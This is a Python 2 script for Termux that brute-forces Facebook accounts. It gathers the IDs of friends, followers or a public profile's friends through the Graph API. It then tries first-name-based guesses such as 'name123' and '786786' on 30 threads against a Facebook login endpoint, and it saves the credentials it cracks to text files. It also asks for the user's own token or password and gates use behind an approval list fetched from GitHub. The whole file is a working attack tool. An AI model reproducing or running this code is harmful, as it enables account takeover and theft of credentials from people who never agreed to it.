#/usr/bin/python2
#writen/coded/by/RAUF
 
try:
 
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
 
    from multiprocessing.pool import ThreadPool
 
except ImportError:
 
    os.system("pip2 install requests")
 
os.system("clear")
 
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
 
    os.system("apt update && apt install nodejs -y")
 
from requests.exceptions import ConnectionError
 
os.system("git pull")
 
if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
 
    os.system("fuser -k 5000/tcp &")
 
    os.system("cd ..... && pip install progress")
 
    os.system("cd ..... && npm install")
 
    os.system("cd ..... && node index.js &")
 
    os.system("clear")
 
    time.sleep(3)
 
elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
 
    os.system("fuser -k 5000/tcp &")
 
    os.system("#")
 
    os.system("cd ..... && node index.js &")
 
    os.system("clear")
 
bd=random.randint(2e7, 3e7)
 
sim=random.randint(2e4, 4e4)
 
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 
reload(sys)
 
sys.setdefaultencoding("utf-8")
 
c = "\033[1;92m"
 
c2 = "\033[0;97m"
 
c3 = "\033[1;91m"
#Dev/RAUF
logo = "\n\x1b[1;92m  d8888b.  .d8b.  db    db d88888b\n\x1b[1;92m  88  `8D d8' `8b 88    88 88'\n\x1b[1;92m  88oobY' 88ooo88 88    88 88ooo\n\x1b[1;92m  88`8b   88~~~88 88    88 88~~~\n\x1b[1;92m  88 `88. 88   88 88b  d88 88\n\x1b[1;92m  88   YD YP   YP ~Y8888P' YP\n\x1b[1;97m-----------------------------------------------\n\x1b[1;92m\xe2\x9e\xa3 PROGRAMER   : CH RAUF JUTT\n\x1b[1;92m\xe2\x9e\xa3 FACEBOOK    : RAUFONFIRE01\n\x1b[1;92m\xe2\x9e\xa3 WHATSAPP    : 03012345678\n\x1b[1;97m-----------------------------------------------"

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Darkrulex/Y0UR-M0TH3RFUCK3R-FT-R4UF/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+14183172106')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+14183172106')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()

  
def main():
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\033[0;97m( CLONING MAIN MENU )").center(50)
 
    print("")
 
    print("\033[1;97m(1)\033[1;91m -> \033[1;91mCLONE PUBLIC ID (Fast)")
 
    print("")
 
    print("\033[1;97m(2)\033[1;91m -> \033[1;91mOWNER INFO")
 
    print("")
 
    print("\033[1;97m(3)\033[1;91m  -> \033[1;91mEXIT TOOL")
 
    print("")
 
    main_select()
 
def main_select():
 
    IKB = raw_input("\033[1;97m-> Select \033[1;91m ")
 
    if IKB =="1":
 
        login()
 
    if IKB =="2":
 
        os.system("xdg-open https://wa.me/+1 (418) 317-2106")
 
	main()
 
    elif IKB =="0":
 
        os.system("exit")
 
    else:
 
        print("-> Please select a valid option").center(50)
 
        time.sleep(2)
 
        main()
 
def login():
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\033[0;97m( LOGIN MAIN MENU )").center(50)
 
    print("")
 
    print("\033[1;97m(1)\033[1;91m -> \033[1;94mLOGIN WITH TOKEN")
 
    print("")
 
    print("\033[1;97m(2)\033[1;91m -> \033[1;94mLOGIN WITH FACEBOOK/ID")
 
    print("")
 
    print("\033[1;97m(3)\033[1;91m -> \033[1;94mMain menu back")
 
    print("")
 
    login_select()
 
def login_select():
 
    IKB = raw_input(" \033[1;97mOption -> \033[1;97m ")
 
    if IKB =="1":
 
        os.system("clear")
 
        print logo
 
        print("")
 
	print("( Login With Token )").center(50)
 
	print("")
 
        token = raw_input("-> Paste Token Here \033[0;93m")
 
        token_s = open(".fb_token.txt","w")
 
        token_s.write(token)
 
        token_s.close()
 
        try:
 
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
            q = json.loads(r.text)
 
            name = q["name"]
 
            nm = name.rsplit(" ")[0]
 
            print("")
 
            print("\033[1;92mYour Token Login Successfully").center(50)
 
            time.sleep(1)
 
	    os.system("xdg-open https://wa.me/+1 (418) 317-2106")
 
 
	    time.sleep(1)
 
            menu()
 
        except (KeyError , IOError):
 
            print("")
 
            print("\033[1;92mToken invalid or Account has loading\033[0;93m").center(50)
 
            print("")
 
            time.sleep(2)
 
            login()
 
    elif IKB =="2":
 
        login_fb()
 
    elif IKB =="3":
 
        main()
 
    else:
 
        print("")
 
        print("Select a valid option").center(50)
 
        print("")
 
        login_select()
 
def login_fb():
 
	os.system("clear")
 
	print logo
 
	print("")
 
	print("[ login with ID/Password ]").center(50)
 
	print("")
 
        id = raw_input("\033[1;91m Email/ID/Number :\033[1;97m ")
 
        id1 = id.replace(' ','')
 
        id2 = id1.replace('(','')
 
        uid = id2.replace(')','')
 
        pwd = raw_input("\033[1;91m Password :\033[1;97m ")
 
        print("")
 
        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 
        q = json.loads(data)
 
        if "access_token" in q:
 
            login_s = open(".login.txt","w")
 
            login_s.write(q["access_token"])
 
            login_s.close()
 
            print("\t\033[1;92mLogin Successfull\033[0;97m")
 
            time.sleep(1)
 
            menu()
 
        else:
 
            if "www.facebook.com" in q["error_msg"]:
 
                print ("\n\033[1;91m-> Login Failed . Account Has a loading\033[0;97m")
 
                time.sleep(1)
 
                login_fb()
 
            else:
 
                print("\n\033[1;91m-> Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")
 
                time.sleep(1)
 
                login_fb()
 
 
 
def menu():
 
    global token
 
    os.system("clear")
 
    print logo
 
    try:
 
        token = open(".fb_token.txt","r").read()
 
    except (KeyError , IOError):
 
        login()
 
    try:
 
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
        q = json.loads(r.text)
 
        nm = q["name"]
 
        nmf = nm.rsplit(" ")[0]
 
        ok = nmf
 
    except (KeyError , IOError):
 
        print("")
 
        print("login account has loading").center(50)
 
        print("")
 
        os.system("rm -rf .fb_token.txt")
 
        time.sleep(1)
 
        login()
 
    except requests.exceptions.ConnectionError:
 
        print logo
 
        print("")
 
        print("Your internet connection failed").center(50)
 
        print("")
 
        time.sleep(2)
 
        menu()
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\t\033[1;92mLogin Account : " +nm)
 
    print("")
 
    print("\033[1;97m[1]\033[1;91m -> \033[1;91mCRACK FROM FRIENDLIST")
 
    print("")
 
    print("\033[1;97m[2]\033[1;91m -> \033[1;91mCRACK FROM PUBLIC ID")
 
    print("")
 
    print("\033[1;97m[3]\033[1;91m -> \033[1;91mCRACK FROM FOLLOWERS ID")
 
    print("")
 
    print("\033[1;97m[0]\033[1;91m -> \033[1;91mLOGOUT")
 
    print("")
 
    menu_select()
 
def menu_select():
 
	select = raw_input("\033[1;97mOption : ")
 
	id=[]
 
	oks=[]
 
	cps=[]
 
	if select=="1":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
 
		z = json.loads(r.text)
 
		for s in z["data"]:
 
			uid=s['id']
 
			na=s['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'|'+nm)
 
	if select =="2":
 
		os.system("clear")
 
		print(logo)
 
		print("")
 
		idt = raw_input("\033[1;97m-> Put Public ID/Username :\033[1;91m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 
			q = json.loads(r.text)
 
			print("-> Account Name : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;97your login account has checkpoint").center(50)
 
		    print("")
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'|'+nm)
 
	elif select =="3":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		idt = raw_input("\033[1;97m-> Put ID/Username :\033[1;91m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 
			q = json.loads(r.text)
 
			print(" Account Name : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;97m login id has checkpoint").center(50)
 
		    print("")
 
		    time.sleep(3)
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'|'+nm)
 
	elif select =="0":
 
	    os.system("exit")
 
	else:
 
	    print("")
 
	    print("Please Select A Valid Option").center(50)
 
	    time.sleep(2)
 
	    menu_select()
 
	print("\033[1;97m-> Total IDs : "+str(len(id)))
 
	time.sleep(0.5)
 
	print("\033[1;97m-> Please wait clone account will be appear here")
 
	print 47*("-")
 
	print('')
 
 
 
	def main(arg):
 
		user=arg
 
		uid,name=user.split("|")
 
		try:
 
		    pass1=name+"123"
 
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		    d=json.loads(q)
 
		    if 'www.facebook.com' in d['error_msg']:
 
		        print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass1)
 
		        ok=open("successfull.txt","a")
 
		        ok.write(uid+" | "+pass1+"\n")
 
		        ok.close()
 
		        oks.append(uid)
 
		    else:
 
		    	if "access_token" in d:
 
		            print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass1+"\x1b[1;0m")
 
		            ok=open("successfull.txt","a")
 
		            ok.write(uid+" | "+pass1+"\n")
 
		            ok.close()
 
		            oks.append(uid)
 
		        else:
 
		            pass2=name+"1234"
 
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		            d=json.loads(q)
 
		            if 'www.facebook.com' in d['error_msg']:
 
		                print("\x1b[1;91m[RAUF-CP] "+uid+" | "+pass2)
 
		                cp=open("cp.txt","a")
 
		                cp.write(uid+" | "+pass2+"\n")
 
		                cp.close()
 
		                cps.append(uid)
 
		            else:
 
		                if 'access_token' in d:
 
		                    print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass2+"\x1b[1;0m")
 
		                    ok=open("successfull.txt","a")
 
		                    ok.write(uid+" | "+pass2+"\n")
 
		                    ok.close()
 
		                    oks.append(uid)
 
		                else:
 
		                    pass3=name+"12345"
 
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                    d=json.loads(q)
 
		                    if 'www.facebook.com' in d['error_msg']:
 
		                        print("\x1b[1;91m[RAUF-CP] "+uid+" | "+pass3)
 
		                        cp=open("cp.txt","a")
 
		                        cp.write(uid+" | "+pass3+"\n")
 
		                        cp.close()
 
		                        cps.append(uid)
 
		                    else:
 
		                        if 'access_token' in d:
 
		                            print(" \x1b[1;92m[RAUF-OK] "+uid+" | "+pass3+"\x1b[1;0m")
 
		                            ok=open("successfull.txt","a")
 
		                            ok.write(uid+" | "+pass3+"\n")
 
		                            ok.close()
 
		                            oks.append(uid)
 
		                        else:
 
		                            pass4=name+"786"
 
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                            d=json.loads(q)
 
		                            if 'www.facebook.com' in d['error_msg']:
 
		                                print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass4)
 
		                                ok=open("successfull.txt","a")
 
		                                ok.write(uid+" | "+pass4+"\n")
 
		                                ok.close()
 
		                                oks.append(uid)
 
		                            else:
 
		                                if 'access_token' in d:
 
		                                    print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass4+"\x1b[1;0m")
 
		                                    ok=open("successfull.txt","a")
 
		                                    ok.write(uid+" | "+pass4+"\n")
 
		                                    ok.close()
 
		                                    oks.append(uid)
 
		                                else:
 
		                                    pass5="786786"
 
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                    d=json.loads(q)
 
		                                    if 'www.facebook.com' in d['error_msg']:
 
		                                        print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass5)
 
		                                        ok=open("successfull.txt","a")
 
		                                        ok.write(uid+" | "+pass5+"\n")
 
		                                        ok.close()
 
		                                        oks.append(uid)
 
		                                    else:
 
		                                        if 'access_token' in d:
 
		                                            print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass5+"\x1b[1;0m")
 
		                                            ok=open("successfull.txt","a")
 
		                                            ok.write(uid+" | "+pass5+"\n")
 
		                                            ok.close()
 
		                                            oks.append(uid)
 
		                                        else:
 
		                                            pass6="223344"
 
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                            d=json.loads(q)
 
		                                            if 'www.facebook.com' in d['error_msg']:
 
		                                                print("\x1b[1;91m[RAUF-CP] "+uid+" | "+pass6)
 
		                                                cp=open("cp.txt","a")
 
		                                                cp.write(uid+" | "+pass6+"\n")
 
		                                                cp.close()
 
		                                                cps.append(uid)
 
		                                            else:
 
		                                                if 'access_token' in d:
 
		                                                    print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass6+"\x1b[1;0m")
 
		                                                    ok=open("successfull.txt","a")
 
		                                                    ok.write(uid+" | "+pass6+"\n")
 
		                                                    ok.close()
 
		                                                    oks.append(uid)
 
		                                                else:
 
		                                                    pass7=name+"12"
 
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                                    d=json.loads(q)
 
		                                                    if 'www.facebook.com' in d['error_msg']:
 
		                                                        print("\x1b[1;91m[RAUF-CP] "+uid+" | "+pass7)
 
		                                                        cp=open("cp.txt","a")
 
		                                                        cp.write(uid+" | "+pass7+"\n")
 
		                                                        cp.close()
 
		                                                        cps.append(uid)
 
		                                                    else:
 
		                                                        if 'access_token' in d:
 
		                                                            print("\x1b[1;92m[RAUF-OK] "+uid+" | "+pass7+"\x1b[1;0m")
 
		                                                            ok=open("successfull.txt","a")
 
		                                                            ok.write(uid+" | "+pass7+"\n")
 
		                                                            ok.close()
 
		                                                            oks.append(uid)
 
 
 
 
 
		except:
 
			pass
 
 
 
	p = ThreadPool(30)
 
	p.map(main, id)
 
	print (" ")
 
	print (47*"-")
 
	print ("-> Your Process has completed Successful")
 
	print ("-> Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
 
	print (47*"-")
 
	raw_input("\t\x1b[0;97mPress enter to main menu back")
 
	menu()
 
 
 
if __name__ == '__main__':
 
    main()
 